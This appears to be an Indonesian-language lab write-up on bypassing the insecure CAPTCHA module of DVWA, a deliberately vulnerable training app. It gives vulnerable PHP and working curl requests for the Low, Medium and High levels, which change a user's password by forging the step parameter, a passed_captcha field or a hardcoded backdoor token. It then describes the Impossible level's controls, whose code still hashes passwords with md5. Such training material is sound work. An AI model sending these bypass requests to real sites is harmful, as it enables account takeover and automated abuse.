---
title: "DVWA : INSECURE RECAPTCHA"
date: 2026-02-05 00:00:00
categories: [Pentest, Web Security]
tags: [recaptcha, cyber security, red team, dvwa]
---

## **PENJELASAN INSECURE RECAPTCHA**

![gambar_recaptcha](/assets/image/2026-02-10-insecure-recaptcha/image1.png)

**CAPTCHA** (*Completely Automated Public Turing test to tell Computers and Humans Apart*) adalah mekanisme keamanan yang dirancang untuk membedakan antara pengguna manusia dan program otomatis (bot). CAPTCHA umumnya ditemukan pada halaman login, registrasi akun, formulir kontak, dan fitur publik lainnya.

Meskipun dirancang untuk menghalangi otomatisasi, implementasi reCAPTCHA yang tidak tepat justru dapat membuka celah bypass. Beberapa kesalahan implementasi yang umum ditemukan:

- Validasi CAPTCHA dilakukan **sepenuhnya di sisi klien (client-side)** sehingga mudah dimanipulasi.
- Proses verifikasi **terpisah dari alur utama** tanpa validasi ulang di tahap kritis.
- Tidak ada mekanisme **state/session** untuk menandai bahwa CAPTCHA telah dilalui.
- Terdapat **backdoor atau development code** yang tertinggal di lingkungan production.

Dampak dari kerentanan ini cukup luas, terutama untuk mendukung serangan otomatis (bot) seperti:

- **Brute force** kredensial
- **Web scraping** atau pencurian data
- **Pembuatan akun masal (account enumeration)**
- **Penghabisan resource server** (CPU, RAM, bandwidth)
- **Denial of Service (DoS)**

---

## **PERCOBAAN SERANGAN DI DVWA**

**DVWA** (*Damn Vulnerable Web Application*) menyediakan modul **Insecure CAPTCHA** dengan empat level keamanan. Skenario yang digunakan adalah mengganti password pengguna secara otomatis tanpa menyelesaikan tantangan CAPTCHA.

![Ilustrasi Form Change Password](/assets/image/2026-02-10-insecure-recaptcha/image4.png)

---

### **Level Low — Pemisahan Step Tanpa Validasi**

Pada level **Low**, implementasi CAPTCHA memisahkan proses menjadi dua tahap:

**Step 1**: Validasi CAPTCHA  
**Step 2**: Proses perubahan password

Sayangnya, **tidak ada pengecekan di step 2** apakah user benar-benar telah melewati step 1. Parameter `step` juga dikirim melalui POST sehingga mudah dimanipulasi.

**Kode rentan (Step 2):**
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        // Update password langsung!
        $insert = "UPDATE `users` SET password = '$pass_new' ...";
    }
}
```

**Eksploitasi dengan cURL:**
```bash
curl 'http://localhost/dvwa/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' \
  -d 'step=2&password_new=hacked456&password_conf=hacked456&Change=Change'
```

Hasilnya, password berhasil diubah tanpa melalui CAPTCHA.

![Respons Password Changed](/assets/image/2026-02-10-insecure-recaptcha/image5.png)  
![Validasi Login](/assets/image/2026-02-10-insecure-recaptcha/image6.png)

---

### **Level Medium — Hidden Field Passed_CAPTCHA**

Level **Medium** mencoba "memperbaiki" dengan menambahkan **hidden field `passed_captcha`** pada form step 2. Namun, karena tidak ada mekanisme session, parameter ini tetap dapat dimanipulasi sepenuhnya oleh client.

**Validasi di server:**
```php
if( !$_POST[ 'passed_captcha' ] ) {
    $html .= "<pre><br />You have not passed the CAPTCHA.</pre>";
    $hide_form = false;
    return;
}
```

**Eksploitasi:**
Penyerang cukup menambahkan parameter `passed_captcha=true` ke dalam request.

```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=SESSION_ID_KAMU; security=medium' \
  -d 'step=2&password_new=hacked999&password_conf=hacked999&passed_captcha=true&Change=Change'
```

![Eksploitasi Level Medium](/assets/image/2026-02-10-insecure-recaptcha/image2.png)  
![Password Berhasil Diubah](/assets/image/2026-02-10-insecure-recaptcha/image3.png)

---

### **Level High — Backdoor Development Code**

Level **High** menunjukkan kesalahan klasik: **development code yang tidak dihapus**. Terdapat kondisi **OR** yang memungkinkan bypass jika salah satu kondisi terpenuhi.

```php
$resp = recaptcha_check_answer(...);

if (
    $resp || 
    (
        $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
        && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
    )
) {
    // CAPTCHA dianggap benar
    // Update password...
}
```

Artinya, penyerang **tidak perlu menyelesaikan CAPTCHA** selama ia mengirim:
- `g-recaptcha-response = hidd3n_valu3`
- `User-Agent: reCAPTCHA`

**Eksploitasi:**
```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'User-Agent: reCAPTCHA' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=SESSION_ID_USER; security=high' \
  --data 'step=2&password_new=hackedeuy&password_conf=hackedeuy&g-recaptcha-response=hidd3n_valu3&Change=Change'
```

![Bypass dengan Backdoor](/assets/image/2026-02-10-insecure-recaptcha/image7.png)  
![Sukses Ganti Password](/assets/image/2026-02-10-insecure-recaptcha/image8.png)

### **Level Impossible**

Pada level Impossible, implementasi CAPTCHA sudah dilakukan dengan pendekatan yang benar dan mengikuti praktik keamanan aplikasi web modern. Verifikasi CAPTCHA tidak berdiri sendiri, tetapi menjadi bagian dari proses perubahan password secara keseluruhan.

```php
if( isset( $_POST[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    
    // Get and sanitize input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_new  = stripslashes( $pass_new );
    $pass_new  = mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new );
    $pass_new  = md5( $pass_new );
    
    // Check CAPTCHA
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );
    
    if( !$resp ) {
        echo "The CAPTCHA was incorrect.";
        $hide_form = false;
    }
    else {
        // Verify current password with prepared statement
        $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
        $data->execute();
        
        if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
            // Update with prepared statement
            $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
            $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
            $data->execute();
            
            echo "Password Changed.";
        }
    }
}
```

Berbeda dengan level sebelumnya, pada level Impossible CAPTCHA diintegrasikan dengan mekanisme keamanan lain sehingga tidak bisa dibypass dengan manipulasi request sederhana. Beberapa kontrol keamanan yang digunakan:

1. Verifikasi CAPTCHA dan perubahan password dilakukan dalam satu proses, bukan dipisah menjadi beberapa step.

2. Sistem menggunakan Anti-CSRF token untuk memastikan request benar-benar berasal dari user yang sah.

    ```php
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    ```

3. Prepared statements (PDO) pada query database untuk mencegah SQL Injection.

    ```php
    if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
        // Update with prepared statement
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();
        echo "Password Changed.";
    ```

4. Semua input difilter dan di-escape sebelum diproses.

    ```php
        // Get and sanitize input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_new  = stripslashes( $pass_new );
        $pass_new  = mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new );
        $pass_new  = md5( $pass_new );
    ```

5. User harus memasukkan password saat ini sebelum dapat mengganti password.

    ```php
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();
    ```

6. Server memverifikasi response CAPTCHA langsung ke layanan reCAPTCHA, bukan hanya mengandalkan data dari client.

    ```php
        // Check CAPTCHA
        $resp = recaptcha_check_answer(
            $_DVWA[ 'recaptcha_private_key' ],
            $_POST['g-recaptcha-response']
        );
        
        if( !$resp ) {
            echo "The CAPTCHA was incorrect.";
            $hide_form = false;
        }
    ```

7. Tidak ada parameter dari sisi klien yang dipercaya begitu saja. Semua divalidasi ulang di server.

---

## **KESIMPULAN**

jadi bukan reCAPTCHA-nya yang tidak aman, tapi implementasinya kudu bener